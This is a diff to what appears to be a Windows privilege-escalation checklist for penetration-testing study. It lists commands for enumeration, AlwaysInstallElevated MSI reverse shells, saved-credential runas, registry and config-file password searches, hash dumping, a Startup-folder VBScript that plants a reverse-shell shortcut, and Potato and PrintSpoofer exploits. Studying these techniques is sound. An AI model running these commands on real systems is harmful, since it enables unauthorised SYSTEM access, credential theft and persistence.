@@ -6,15 +6,15 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
 1- PowerUp: https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
   example of usage: 
   - first get Powershell sessions 
-    * powershell -exec bypass
-  - . .\PowerUp.ps1
-  - Invoke-AllChecks
+    > powershell -exec bypass
+    > . .\PowerUp.ps1
+    > Invoke-AllChecks
   
 2- SharpUp: 
   - Code: https://github.com/GhostPack/SharpUp
   - Pre-Compiled: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe
   example of usage:
-  - .\SharpUp.exe
+    > .\SharpUp.exe
   
 3- Seatbelt:
   - Code: https://github.com/GhostPack/Seatbelt
@@ -24,7 +24,7 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
  
 4- WinPEAS:  https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
   example of usage:
-  - WinPEAS.exe
+  > .\WinPEAS.exe
   
 5- accesschk.exe:
   - AccessChkis an old but still trustworthy tool for checking user access control rights.
@@ -34,29 +34,30 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
   - First Enumerate Windows version/patch level (systeminfo).
   - Find exploits on (searchsploit, Google, ExploitDB, GitHub)
   - Compile & run
- * Tools to ease the proccess of finding the correct exploit:
+  
+  - Tools to ease the proccess of finding the correct exploit:
   - Windows Exploit Suggester: https://github.com/bitsadmin/wesngPrecompiled 
-- Pro Tip: First Check Those Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits
-  - Watson: https://github.com/rasta-mouse/Watson
+  - Pro Tip: First Check Those Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits
+    - Watson: https://github.com/rasta-mouse/Watson
   
 2- Service Exploits:
    - Insecure Service Permissions
-      - NOTE: if you can change a service configuration but cannot stop/start the service you may on RABBIT HOLE
+      - NOTE: if you can change a service configuration but cannot stop/start the service you may fall on RABBIT HOLE
    - Unquoted Service Path
    - Weak Registry Permissions
    - Insecure Service Executables
    - DLL Hijacking
   
 3- Registery Exploit:
-  * AutoRun executables
+  - AutoRun executables
   - check for writable AutoRun executables
-  .\winPEASany.exequiet applicationsinfo
+    > .\winPEASany.exequiet applicationsinfo
   
   - then use accesschk.exe to verify the permissions on each one:
-  .\accesschk.exe /accepteula -wvu "[file PATH]"
+    > .\accesschk.exe /accepteula -wvu "[file PATH]"
         
       
-   * AlwaysInstallElevated
+   - AlwaysInstallElevated
    - NOTE: Two Registry settings must be enabled for this to work.
           The “AlwaysInstallElevated” value must be set to 1 
           for both the local machine:
@@ -67,22 +68,22 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
     - check both registry values by winPEAS
             > .\winPEASany.exequiet windowscreds
     - Then Create a new reverse shell with msfvenom, using the msi format, and save it with the .msi extension
-    -  msiexec /quiet /qn /i [the path ov created reverse shell e.g. C:\PrivEsc\reverse.msi]
+        > msiexec /quiet /qn /i [the path ov created reverse shell e.g. C:\PrivEsc\reverse.msi]
         
 4- Passwords
   - searching registery for passwords
     - Auto: 
-      - .\winPEASany.exe quiet filesinfo userinfo
+      > .\winPEASany.exe quiet filesinfo userinfo
     - Manually:
       > reg query HKLM /f password /t REG_SZ /s
       > reg query HKCU /f password /t REG_SZ /s
   - Saved Creds
-    - .\winPEASany.exe quiet cmd windowscreds
-    - runas /savecred /user:[user gotten from pervious command] C:\[reverse_shell_path.exe]
+    > .\winPEASany.exe quiet cmd windowscreds
+    > runas /savecred /user:[user gotten from pervious command] C:\[reverse_shell_path.exe]
   - Configuration Files
-    - dir/s *pass* == *.config
-    - findstr/sipassword *.xml *.ini*.txt
-    - .\winPEASany.exe quiet cmd searchfast filesinfo
+    > dir/s *pass* == *.config
+    > findstr/sipassword *.xml *.ini*.txt
+    > .\winPEASany.exe quiet cmd searchfast filesinfo
   - SAM & SYSTEM
     - if you get SAM & SYSTEM can used to dump hashes by the following steps
       - first: Download the latest version of the creddump suite:
@@ -113,12 +114,18 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
    - First: check your permissions on the StartUp directory:
       > .\accesschk.exe/accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    
-   - Second: create file CreateShortcut.vbs with the VBScript code to create a shortcut file:
-   `Set oWS= WScript.CreateObject("WScript.Shell")
-   sLinkFile= "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
-   Set oLink= oWS.CreateShortcut(sLinkFile)
-   oLink.TargetPath= "C:\PrivEsc\reverse.exe"
-   oLink.Save`
+   - Second: create file & name it "CreateShortcut.vbs" the content of the file is a VBScript code to create a shortcut file of our reverse shell:
+   
+`Set oWS= WScript.CreateObject("WScript.Shell")
+
+sLinkFile= "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+
+Set oLink= oWS.CreateShortcut(sLinkFile)
+
+oLink.TargetPath= "C:\PrivEsc\reverse.exe"
+
+oLink.Save`
+
    - Finally: run the script:
     > cscript CreateShortcut.vbs
     
@@ -141,7 +148,7 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
    - Juicy Potato
       - https://github.com/ohpe/juicy-potato
       > C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
-      - "-c" argument take CLSID, so if it doesn't work check this list: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md or run GetCLSID.ps1 PowerShell script.
+      - Note: "-c" argument take CLSID, so if it doesn't work check this list: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md or run GetCLSID.ps1 PowerShell script.
     
    - Rogue Potato:
       - Latest of the "Potato" exploits.
@@ -162,10 +169,38 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
         - PrintSpoofer is an exploit that targets the Print Spooler service.
             GitHub: https://github.com/itm4n/PrintSpoofer
             Blog: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges
-        - Usage: C:\PrivEsc\PrintSpoofer.exe –i -c "C:\PrivEsc\reverse.exe"
+        - Usage: 
+        > C:\PrivEsc\PrintSpoofer.exe –i -c "C:\PrivEsc\reverse.exe"
         
         
-        
+ 10- User Privileges:
+  - In Windows, user accounts and groups can be assigned specific “privileges”.These privileges grant access to certain abilities.Some of these abilities can be used to escalate our overall privileges to that of SYSTEM.
+  - Highly detailed paper: https://github.com/hatRiot/token-priv
+  - To list out Privileges:
+    > whoami /priv
+  - Note: that "disabled" in the state column is irrelevant here. we will talk about only "Enabled" privileges that your user has it.
+  
+  - SeImpersonatePrivilege:
+    - Can be used to get PrivEsc by Juicy Potato exploit
+  - SeAssignPrimaryPrivilege:
+    - Can be used to get PrivEsc by Juicy Potato exploit
+  - SeBackupPrivilegs:
+    - Can be used to get PrivEsc by gaining access to sensitive files, or extract hashes from the registry which could then be cracked or used in a pass-the-hash attack.
+  - SeRestorePrivilege:
+    - Can be used to get PrivEsc by multitude of ways to abuse this privilege:
+      • Modify service binaries.
+      • Overwrite DLLs used by SYSTEM processes
+      • Modify registry settings
+  - SeTakeOwnershipPrivilege:
+    - The SeTakeOwnership Privilege lets the user take ownership over an object (the WRITE_OWNER permission).
+    - Once you own an object, you can modify its ACL and grant yourself write access.
+    - The same methods used with SeRestorePrivilegethen apply.
+      
+  - Other Privileges (More Advanced) can be used on Privilege Escalation process: 
+    • SeTcbPrivilege
+    • SeCreateTokenPrivilege
+    • SeLoadDriverPrivilege
+    • SeDebugPrivilege(used by getsystem)
 ## Privileges Escalition:
   1- Check your user (whoami) and groups (net user <username>)
   
